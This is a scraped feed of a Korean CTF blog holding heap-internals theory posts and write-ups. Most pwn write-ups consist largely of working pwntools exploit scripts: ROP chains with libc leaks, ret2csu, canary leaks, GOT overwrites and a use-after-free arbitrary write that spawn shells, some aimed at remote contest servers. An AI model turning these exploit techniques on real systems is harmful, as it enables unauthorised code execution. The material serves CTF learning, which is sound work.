malloc(100); printf(\"malloc(100) A : %p\\n\", a); printf(\"malloc(100) B : %p\\n\", b); printf(\"malloc(100) C : %p\\n\", c); printf(\"malloc(100) D : %p\\n\", d); free(a); free(b); free(c); free(d); puts(\"-------free malloc A-------\"); puts(\"-------free malloc B-------\"); puts(\"-------free malloc C-------\"); puts(\"-------free malloc D-------\"); a = malloc(100); b = malloc(100); c = malloc(100); d = malloc(100); puts(\"-------malloc(100) A-------\"); puts(\"-------malloc(100) B-------\"); puts(\"-------malloc(100) C-------\"); puts(\"-------malloc(100) D-------\"); printf(\"malloc(100) A : %p\\n\", a); printf(\"malloc(100) B : %p\\n\", b); printf(\"malloc(100) C : %p\\n\", c); printf(\"malloc(100) D : %p\\n\", d);&#125; [Example2.c] 다음은 fastbin 예제이다. fastbin은 단일 연결 리스트[3]라서 메모리 할당 및 해제 속도가 빠르며 LIFO 구조를 지니고 있다. 아래의 과정을 확인해보면 알 수 있다. head - a - tail free⒜ head - b - a - tailfree⒝ head - c - b - a - tail free⒞ head - d - c - b - a - tail free⒟ head - c - b - a - tail malloc⒜ head - b - a - tail malloc⒝ head - a - tail malloc⒞ head - tail malloc⒟ [실행 결과] Reference img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); } 1.동적할당 ↩2.할당해제 ↩3.Singly Linked list ↩","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"Security Fest 2019 baby2","slug":"Security-Fest-2019-baby2","date":"2019-05-24T00:03:43.000Z","updated":"2019-06-23T10:57:39.693Z","comments":true,"path":"2019/05/24/Security-Fest-2019-baby2/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/","excerpt":"","text":"Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는 main으로 안 돌아가는 경우도 있는 것 같다. [1] (일단 난 잘됨) 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process('./baby2')r = remote('baby-01.pwn.beer', 10002)e = ELF('./baby2')libc = ELF('./libc.so.6')ru = lambda a: r.recvuntil(a)sl = lambda a: r.sendline(a)sla = lambda a, b: r.sendlineafter(a, b)ex = lambda : r.interactive()puts_offset = libc.symbols['puts']puts_plt = e.plt['puts']puts_got = e.got['puts']main = e.symbols['main']pr = 0x0000000000400783 # pop rdi; retbinsh_offset = libc.search('/bin/sh').next()system_offset = libc.symbols['system']one_gadget = 0x4f2c5p = \"\"p += \"\\x90\"*0x18p += p64(pr)p += p64(puts_got)p += p64(puts_plt)p += p64(main) sl(p)ru(\"input: \")leaked = u64(r.recv(6).ljust(8, '\\x00'))print hex(leaked)libc_base = leaked - puts_offsetone_shot = libc_base + one_gadgetp = \"\"p += \"\\x90\"*0x18p += p64(one_shot)sla('input: ', p)ex() [Exploit Code] [Remote] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); } 1.내부 인스트럭션에서 조금 차이가 있는 듯하다. 참고 ↩","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Security Fest 2019 baby1","slug":"Security-Fest-2019-baby1","date":"2019-05-24T00:01:52.000Z","updated":"2019-05-27T14:43:16.033Z","comments":true,"path":"2019/05/24/Security-Fest-2019-baby1/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/","excerpt":"","text":"Baby2 12345678910111213141516171819from pwn import *#r = process('./baby1')r = remote('baby-01.pwn.beer', 10001)e = ELF('./baby1')binsh = e.search(\"/bin/sh\").next()pr = 0x0000000000400793 # pop rdi; ret ru = lambda a: r.recvuntil(a)sl = lambda a: r.sendline(a)sla = lambda a, b: r.sendlineafter(a, b)ex = lambda : r.interactive()p = \"A\"*0x18p += p64(pr)p += p64(binsh)p += p64(e.symbols['win'])sl(p)ru(\"input: \")ex(); [Exploit Code]","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"ALLMN CTF 2019 Doesn't contain K integer","slug":"doesnt_contain_k_integer","date":"2019-05-04T17:06:00.000Z","updated":"2019-05-24T13:14:03.695Z","comments":true,"path":"2019/05/05/doesnt_contain_k_integer/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/","excerpt":"","text":"Doesn’t contain K integer 123How many numbers from 1 to N that don&apos;t contain K number. Input: N (integer number) and space K (integer number). Output: The total number. Example if N is 30 and K is 3 there are 27 numbers that don&apos;t contain number 3. So the flag will be ALLMN&#123;total number&#125; [문제 내용] 123456n = 281939942k = 3for i in range(n): if '3' in str(i): n -= 1 print \"total is \" + str(n) [Python] 파이썬으로 짜면 금방인 문제. 하지만 간단하면서도 간단하지 않다. 계산하는 수가 매우 높아서 소요 시간이 개노답이기 때문이다. 그래서 결국 c로 다시 뚝딱했다.[1] c로도 약 2시간 30분이 소요 됐다. (더 빠른 알고리즘이 있겠지만 아몰랑) 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int main(void)&#123; int num_start = 1; int num_end = 281939942; int num = 0; int digit = 3; int count = 0; digit %= 10; for (num = num_start; num &lt;= num_end; num++) &#123; int temp_num = num; int have = 0; if (num == 0) &#123; if (digit == 0) &#123; have = 1; &#125; &#125; else &#123; while (temp_num &gt; 0) &#123; if (temp_num % 10 == digit) &#123; have = 1; break; &#125; temp_num /= 10; &#125; &#125; if (have == 1) &#123; count++; if (count &gt; 1) &#123; printf(\", \"); &#125; printf(\"%d \", num); &#125; &#125; printf(\"\\n\\ncount : %d\\n\", num_end-count+1); return 0;&#125; [C] [Run] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); } 1.C와 Python의 연산 속도는 약 100배가량 차이가 난다. ↩","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Script","slug":"WriteUps/Script","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Script/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Reutrn-to-Csu Theory","slug":"rtc_theory","date":"2019-04-01T05:00:00.000Z","updated":"2019-05-22T05:51:48.493Z","comments":true,"path":"2019/04/01/rtc_theory/","link":"","permalink":"http://j0n9hyun.github.io/2019/04/01/rtc_theory/","excerpt":"","text":"Return-to-csu Binary File 64bit ROP 기법을 사용할 때 우리는 gadget을 이용하곤 한다. 하지만 우리가 원하는 pop gadget이 존재하지 않을 경우는 어떻게 할까? 바로 RTC 를 사용하여 우회를 시킬 수 있다. 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-40h] setvbuf(stdin, 0LL, 2, 0LL); write(1, \"Hey, ROP! What's Up?\\n\", 0x15uLL); return read(0, &amp;buf, 0x200uLL);&#125; [Problem] 확인하기 위해 본인 사이트에 올라가 있는 문제를 예시로 들겠다. 문제에는 일반적인 ROP처럼 write 함수와 read 함수가 주어져있다. 123456789101112[INFO] File: rtc0x00000000004006bc: pop r12; pop r13; pop r14; pop r15; ret; 0x00000000004006be: pop r13; pop r14; pop r15; ret; 0x00000000004006c0: pop r14; pop r15; ret; 0x00000000004006c2: pop r15; ret; 0x000000000040054f: pop rbp; mov edi, 0x601048; jmp rax; 0x00000000004006bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 0x00000000004006bf: pop rbp; pop r14; pop r15; ret; 0x0000000000400560: pop rbp; ret; 0x00000000004006c3: pop rdi; ret; 0x00000000004006c1: pop rsi; pop r15; ret; 0x00000000004006bd: pop rsp; pop r13; pop r14; pop r15; ret; [gadgets] gadget 도구를 이용해서 확인해보면 rdi와 rsi를 채울 수 있을만한 gadget이 보이지 않는다. 그래도 괜찮다 우리에겐 csu가 있으니까! _libc_csu_init 이라는 함수를 어셈블리 뷰로 확인해보자. 123456789101112131415161718192021.text:0000000000400660 ; void _libc_csu_init(void).text:0000000000400660 public __libc_csu_init.text:0000000000400660 __libc_csu_init proc near.text:0000000000400660 ; __unwind &#123;.text:0000000000400660 push r15.text:0000000000400662 push r14.text:0000000000400664 mov r15d, edi.text:0000000000400667 push r13.text:0000000000400669 push r12.text:000000000040066B lea r12, __frame_dummy_init_array_entry.text:0000000000400672 push rbp.text:0000000000400673 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040067A push rbx.text:000000000040067B mov r14, rsi.text:000000000040067E mov r13, rdx.text:0000000000400681 sub rbp, r12.text:0000000000400684 sub rsp, 8.text:0000000000400688 sar rbp, 3.text:000000000040068C call _init_proc.text:0000000000400691 test rbp, rbp.text:0000000000400694 jz short loc_4006B6 [libc_csu_init] 1234567891011.text:00000000004006B6 loc_4006B6:.text:00000000004006B6 add rsp, 8.text:00000000004006BA pop rbx.text:00000000004006BB pop rbp.text:00000000004006BC pop r12.text:00000000004006BE pop r13.text:00000000004006C0 pop r14.text:00000000004006C2 pop r15.text:00000000004006C4 retn.text:00000000004006C4 ; &#125; // starts at 400660.text:00000000004006C4 __libc_csu_ini [libc_csu_init gadget1] 여기서 우리가 조작할 수 있는 주소는 rbx, rbp, r12, r13, r14, r15 이다. 첫번째, 두번째 인자값을 받는 rdi, rsi가 없는데 어떻게 할 수 있을까란 생각이 들 수 있겠지만 그 부분은 바로 아래의 코드를 확인하면 알 수 있을 것이다. 12345678.text:00000000004006A0 loc_4006A0:.text:00000000004006A0 mov rdx, r13.text:00000000004006A3 mov rsi, r14.text:00000000004006A6 mov edi, r15d.text:00000000004006A9 call qword ptr [r12+rbx*8].text:00000000004006AD add rbx, 1.text:00000000004006B1 cmp rbx, rbp.text:00000000004006B4 jnz short loc_4006A0 [libc_csu_init gadget2] [gadget1] 코드에서 pop 해줬던 r15,r14,r13 값을 다시 edi,rsi,rdx에 셋팅한다.(보다시피 rdi가 아닌 edi라서 edi 값은 32비트 범위의 한해서만 조작이 가능하다.) 그리고는 r12+rbx*8한 값을 호출하는데 rbx 값을 0으로 셋팅해준다면 0[rbx] * 8이 돼서 최종적으로 r12의 값만 호출할 수 있게끔 한다. rbx의 값에 1을 더하고 rbp값과 비교연산을 거친다. rbx값을 1로 셋팅해준다면 조건분기문도 성립되어 문제 없이 통과하게 된다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"0CTF CTF 2019 aegis (Incompletion)","slug":"0ctf_aegis","date":"2019-03-26T01:45:00.000Z","updated":"2019-05-24T15:48:46.096Z","comments":true,"path":"2019/03/26/0ctf_aegis/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/","excerpt":"","text":"aegis Binary File [Mitigation] 잘 안 보이는 보호기법이 추가되었다. (대회에서 나온 거 처음 봄) [In IDA] IDA를 통해서 열어보면 ASAN, UBSAN 보호기법의 영향으로 마치 libc 파일을 여는 듯이 불러오는 함수가 많다. (보기 싫어진다) [main.c] 여느 힙 문제와 같이 메뉴들이 주어졌는데 하단에 보면 히든 메뉴가 있다. [굉장히 보기 싫게 생긴 코드] [delete menu] 이 부분에서 UAF가 발생한다. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *p = process('./aegis')def add_note(size, content, ID): p.sendlineafter(\"Choice: \", \"1\") p.sendlineafter(\"Size: \", str(size)) p.sendafter(\"Content: \", str(content)) p.sendlineafter(\"ID: \", str(ID))def show_note(index): p.sendlineafter(\"Choice: \", \"2\") p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"Content: \", str(p.recvline)) return p.recvline()def update_note_sendline(index, new_content, new_ID): p.sendlineafter(\"Choice: \", \"3\") p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))def update_note(index, new_content, new_ID): p.sendlineafter(\"Choice: \", \"3\") p.sendlineafter(\"Index: \", str(index)) p.sendafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))def delete_note(index): p.sendlineafter(\"Choice: \", \"4\") p.sendlineafter(\"Index: \", str(index))def secret(addr): p.sendlineafter(\"Choice: \", \"666\") p.sendlineafter(\"Lucky Number: \", str(addr))def exit(): p.sendlineafter(\"Choice: \", \"5\")def to_asan(addr): return ((addr &gt;&gt; 3) + 0x7fff8000)def leak_word(): note_data = show_note(0) print \"note data\", note_data note_data = note_data.split('\\n')[0] note_data = (u64(note_data.ljust(8, '\\x00'))) return note_dataVAL = 0xffffffffffffffffadd_note(16, \"a\"*8, VAL)add_note(16, \"b\"*8, VAL)addr = to_asan(0x602000000020)print \"magiccc\", hex(addr)secret(addr)# do 1st updateupdate_note(0, 'C'*18, 0xffff)# do 2nd updatepayload = 'd'*16 + '\\x02'*3payloadid = 0xffffffff02ffffffupdate_note_sendline(0, payload, payloadid)delete_note(0)add_note(16, p64(0x602000000018), 0x00)note_data = leak_word()cfi = note_datatext_base = note_data - 1133232log.progress(\"Text base: &#123;&#125;\".format((hex(text_base))))got_offset = 0x000000000347E28def arb_read(addr): update_note(2, \"c\"*(1)+\"\\n\", VAL) update_note(2, \"c\"*(2), 0xffff) update_note(2, \"c\"*(4), 0xffff) update_note(2, \"c\"*(6), 0xffff) update_note(2, \"c\"*(8), 0xffff) update_note(2, p64(addr)[0:7] + \"\\n\", cfi) note_data = leak_word() return note_datalibc = arb_read(got_offset + text_base)libc -= 526784log.progress(\"LIBC: &#123;&#125;\".format(hex(libc)))one_gadget = libc + 0x10a38c+12log.progress(\"ONE GADGET: &#123;&#125;\".format(hex(one_gadget)))malloc_hook_offset = 0x00000000003ebc30main_arena_offset = 4111424asan_malloc_hook_offset = 0x7ae140san_userdie_callback = 0xFB0888strtoul_got_offset = 0x347f20environ_offset = 4120728# intercepted methodsreal_vprintf_off = 0x55BBB0real_memset_off = 0x55Bd30real_cxa_atexit = 0x559208update_func = text_base + 0x114614main_func = text_base + 0x114990# perform overwrite!overwrite_addr = text_base + san_userdie_callback + 0x18 pop_rdx_rcx_rbx_ret = 0x0000000000103cc9 ret = 0x0000000000b17c5def arb_write(addr, val, idval = 0, use_cfi = True): update_note(2, \"c\"*(1)+\"\\n\", VAL) update_note(2, \"c\"*(2), 0xffff) update_note(2, \"c\"*(4), 0xffff) update_note(2, \"c\"*(6), 0xffff) update_note(2, \"c\"*(8), 0xffff) mycfi = cfi if use_cfi else 0 update_note(2, p64(addr)[0:6] + \"\\n\", one_gadget &lt;&lt; 8) print \"idval\", hex(idval) update_note(0, p64(val)[0:6] + \"\\n\", 0)def update_trunc(index, new_content, new_ID): p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))rop_gadget = libc + 0x9df05arb_write(overwrite_addr, rop_gadget, idval=libc + ret, use_cfi = False)p.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 EZ","slug":"EZ","date":"2019-03-25T07:27:00.000Z","updated":"2019-05-24T13:14:09.679Z","comments":true,"path":"2019/03/25/EZ/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/EZ/","excerpt":"","text":"EZ File [Problem] [Steganography Decoding] [Hidden.txt] [Googling] [SHA-1 Encoding] flag is Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 HIDDEN","slug":"securinets_hidden","date":"2019-03-25T06:41:00.000Z","updated":"2019-05-25T13:59:13.550Z","comments":true,"path":"2019/03/25/securinets_hidden/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinets_hidden/","excerpt":"","text":"HIDDEN [Problem] [Web Page] [Get FLAG] img.border-shadow { border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Easy Trade","slug":"securinet_easy_trade","date":"2019-03-25T06:25:00.000Z","updated":"2019-05-24T15:48:13.132Z","comments":true,"path":"2019/03/25/securinet_easy_trade/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/","excerpt":"","text":"Easy Trade Pcap File [Problem] [Pcap File 1-1] [Pacp File 1-2] [4444 Port Packet] [Hxd] [flag.zip] [Zip Password] [Base64 Decoding] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Baby One","slug":"securinet_baby1","date":"2019-03-25T05:22:00.000Z","updated":"2019-05-24T15:47:31.032Z","comments":true,"path":"2019/03/25/securinet_baby1/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinet_baby1/","excerpt":"","text":"Baby One Binary File [Problem] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process('./baby1')#r = remote('51.254.114.246', 1111)e = ELF('./baby1', checksec=False)libc = e.libcpr = 0x4006c3csu_init1 = 0x4006B6csu_init2 = 0x4006A0main_addr = e.symbols['main']write_got = e.got['write']write_os = libc.symbols['write']read_got = e.got['read']system_os = libc.symbols['system']binsh_os = libc.search('/bin/sh').next()libc_start = e.got['__libc_start_main']payload = \"\"payload += 'A'*56payload += p64(csu_init1)payload += \"A\"*8payload += p64(0)payload += p64(1)payload += p64(write_got)payload += p64(8)payload += p64(write_got)payload += p64(1)payload += p64(csu_init2)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(main_addr)r.recvline()r.sendline(payload)leaked = u64(r.recv(6).ljust(8, '\\x00'))libc_base = leaked - write_ossystem_addr = libc_base + system_osbinsh_addr = libc_base + binsh_ospayload = \"\"payload += 'A'*56payload += p64(pr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendlineafter(\"\\n\", payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Welcome","slug":"securinets_welcome","date":"2019-03-25T05:20:00.000Z","updated":"2019-05-24T13:14:36.783Z","comments":true,"path":"2019/03/25/securinets_welcome/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinets_welcome/","excerpt":"","text":"Welcome [Problem] [wrapper.c] [Get FLAG] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Tcache Theory Analysis","slug":"tcache_theory","date":"2019-03-19T01:21:00.000Z","updated":"2019-05-22T07:49:40.692Z","comments":true,"path":"2019/03/19/tcache_theory/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/19/tcache_theory/","excerpt":"","text":"Tcache 12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread char tcache_shutting_down = 0;static __thread tcache_perthread_struct *tcache = NULL; [tcache_entry] Ubuntu 17.04 에서 glibc 2.6 버전이 릴리즈 되었는데 tcache_entry와 tcache_perthread_struct라는 구조체가 새로 추가되었다. 특징 Single linked list(단일 연결 구조)를 이루고 있다. Consolidate를 하지 않는다. LIFO 구조를 가지고 있다. Pointer가 오직 next chunk만 포함하고 있다. 기본적으로 Chunk Size는 24 ~ 1032 bytes 이다. (32bit : 12 ~ 516 bytes) 123/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 tcache bin 한 개당 기본적으로 7개의 Chunk를 가질 수 있다. 123#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64 12345678910111213tcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; [tcache_put] 12345678910111213/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;counts[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; [tcache_get] tcache_put과 tcache_get 함수는 _int_free 와 __libc_malloc 함수가 시작할때 호출된다. tacace_get은 할당된 크기의 영역이 요청될때 0x408보다 작으면 호출된다. [free] [한번 더 free] entry와 count가 보이는 것을 알 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"Warm Heap","slug":"warm_heap","date":"2019-03-05T02:22:00.000Z","updated":"2019-05-24T13:14:47.047Z","comments":true,"path":"2019/03/05/warm_heap/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/05/warm_heap/","excerpt":"","text":"Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; void *v3; // ST10_8 void *v4; // ST18_8 char s; // [rsp+20h] [rbp-1010h] unsigned __int64 v6; // [rsp+1028h] [rbp-8h] v6 = __readfsqword(0x28u); v3 = malloc(16uLL); *(_DWORD *)v3 = 1; *((_QWORD *)v3 + 1) = malloc(8uLL); v4 = malloc(16uLL); *(_DWORD *)v4 = 2; *((_QWORD *)v4 + 1) = malloc(8uLL); fgets(&amp;s, 4096, stdin); strcpy(*((char **)v3 + 1), &amp;s); fgets(&amp;s, 4096, stdin); strcpy(*((char **)v4 + 1), &amp;s); exit(0);&#125; [메인 함수] [동작 과정] 12345678910from pwn import *r = process('./warm_heap.bin')elf = ELF('./warm_heap.bin')flag = 0x400826exit_got = 0x601068dpayload = \"A\"*40 + p64(elf.got['exit']) + \"\\n\" + p64(flag)r.sendline(payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"CODEGATE 2018 betting","slug":"betting","date":"2019-02-19T13:30:00.000Z","updated":"2019-05-24T13:14:57.359Z","comments":true,"path":"2019/02/19/betting/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/19/betting/","excerpt":"","text":"betting Binary File [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자. [사진 1-2] [사진 1-3] 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다. 12345678910111213141516171819202122232425from pwn import *r = process('./betting')helper = 0x4008F6def canary(): global canary r.sendlineafter(\"? \", \"A\"*24) r.sendlineafter(\"? \", \"2\") r.recvuntil(\"A\"*24 + \"\\n\") canary = u64(\"\\x00\" + r.recv()[:7]) r.sendlineafter(\"? \", \"2\")def exploit(): payload = \"\" payload += \"A\"*40 payload += p64(canary) payload += \"A\"*8 payload += p64(helper) r.sendline(payload) r.interactive()if __name__ == \"__main__\": canary() exploit() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"DEFCON 2015 r0pbaby","slug":"r0pbaby","date":"2019-02-18T10:07:00.000Z","updated":"2019-05-24T13:14:52.571Z","comments":true,"path":"2019/02/18/r0pbaby/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/18/r0pbaby/","excerpt":"","text":"r0pbaby Binary File [바이너리 보호기법 확인] [실행 화면 메뉴] 1번 진입시, libc의 주소를 알려준다. 하지만 확인해보니 실제 libc 주소는 아니었다. 2번 진입시, symbol 입력란이 추가로 뜨는데 여기서 system 함수의 주소를 알려준다. 3번 진입시, 최대 1024 바이트까지 버퍼를 보낼 수 있다. 우리가 최종적으로 페이로드를 보내는 곳이다. [system 함수 주소] libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. PIE가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다. 3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 